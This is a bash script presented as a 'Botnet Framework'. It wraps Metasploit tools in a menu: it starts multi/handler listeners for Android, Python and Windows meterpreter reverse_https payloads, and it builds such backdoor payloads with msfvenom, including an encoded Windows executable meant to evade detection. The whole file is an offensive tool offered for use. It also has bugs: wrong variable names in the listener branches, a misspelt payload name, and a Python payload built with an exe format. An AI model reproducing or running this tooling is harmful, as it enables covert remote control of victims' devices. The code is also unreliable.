#!/bin/bash
clear
echo
echo ""
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo "|          ______   _______          _________ _                  |"
echo "|         (  __  \ (  ____ \|\     /|\__   __/( \                 |"
echo "|         | (  \  )| (    \/| )   ( |   ) (   | (                 |"
echo "|         | |   ) || (__    | |   | |   | |   | |                 |"
echo "|         | |   | ||  __)   ( (   ) )   | |   | |                 |"
echo "|         | |   ) || (       \ \_/ /    | |   | |                 |"
echo "|         | (__/  )| (____/\  \   /  ___) (___| (____/\           |"
echo "|         (______/ (_______/   \_/   \_______/(_______/           |"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo "|                                                                 |"
echo "|                 Botnet Framework                                |"
echo "|                                                                 |"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo
echo
echo " Choose The Desired Option "
echo ""
echo " 1. Server Start        "
echo " 2. Botnet Build        "
echo
read -p "Option No. > " opt
case $opt in
	1)
		clear
		echo "+++++++++++++++++++++++++++++++++++"
		echo "|Choose the Desired Payload Server|"
		echo "+++++++++++++++++++++++++++++++++++"
		echo
		echo "+++++++++++++++++++++++++++"
		echo "|  1. Android (apk)       |"
		echo "|  2. Linux/Mac Osx (py)  |" 		
		echo "|  3. Windows (exe)       |"
		echo "+++++++++++++++++++++++++++"
		read -p "Option No. > " opt
		case $opt in
			1)
				read -p "Enter Your IP Address >" ip
				read -p "Enter Your Local Port No. >" p
				
					gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_https; set LHOST $ip; set LPORT $p; exploit -j"
			    
				;;
			2)
				read -p "Enter Your IP Address >" ip2
				read -p "Enter Your Local Port No. >" p2

					gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_https; set LHOST $ip; set LPORT $p; exploit -j"
				

				;;
			3)
				read -p "Enter Your IP Address >" ip3
				read -p "Enter Your Local Port No. >" p3

				   gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST $ip; set LPORT $p; exploit -j"
				
				;;
			*)
				echo "[-] Error : Invalid Option Selected"

				;;
		esac
		;;
	2)
		clear
		echo
		echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
		echo "|                                                      |"
		echo "|Choose The Desired Option to Create Suitable Payload:-|"
		echo "|                                                      |"
		echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
		echo
		echo
		echo "++++++++++++++++++++++++++++++++++"
		echo "| 1. Android (apk)               |"
		echo "| 2. Windows (exe)               |"
		echo "| 3. Linux/MacOSx (py)           |"
		echo "++++++++++++++++++++++++++++++++++"
		read -p "Option No. > " opt 
		case $opt in
			1)
				read -p "Enter Your IP Address >" ip
				read -p "Enter Your Local Port No. >" p
			   echo "Have Patience while Creating Payload..........."
				gnome-terminal -- msfvenom -p android/meterpreter/reverse_https lhost=$ip LPORT=$p R> /root/Desktop/Payload.apk
				sleep 10
				echo "Payload is been created Successfully"
				sleep 10
				echo "Payload is located at /root/Desktop Named > $N.apk"
					
					;;

			2) 
				read -p "Enter Your IP Address >" ip2
				read -p "Enter Your Local Port No. >" p2
				read -p "Enter Your Payload Name >" N
				gnome-terminal -- msfvenom -p windows/x86/meterpreter/reverse_https -e x86/shikata_ga_nai lhost=$ip2 lport=$p2 -i 20 -f exe R> /root/Desktop/$N.exe
				sleep 10
				echo "Payload is been created Successfully"
				sleep 10
				echo "Payload is located at /root/Desktop Named > $N.exe"

				;;

			3)  read -p "Enter Your IP Address >" ip2
				read -p "Enter Your Local Port No. >" p2
				read -p "Enter Your Payload Name >" N
				gnome-terminal -- msfvenom -p pyhton/meterpreter/reverse_https  lhost=$ip2 lport=$p2 -i 20 -f exe R> /root/Desktop/$N.py
				sleep 10
				echo "Payload is been created Successfully"
				sleep 10
				echo "Payload is located at /root/Desktop Named > $N.py"

				;;
		esac

esac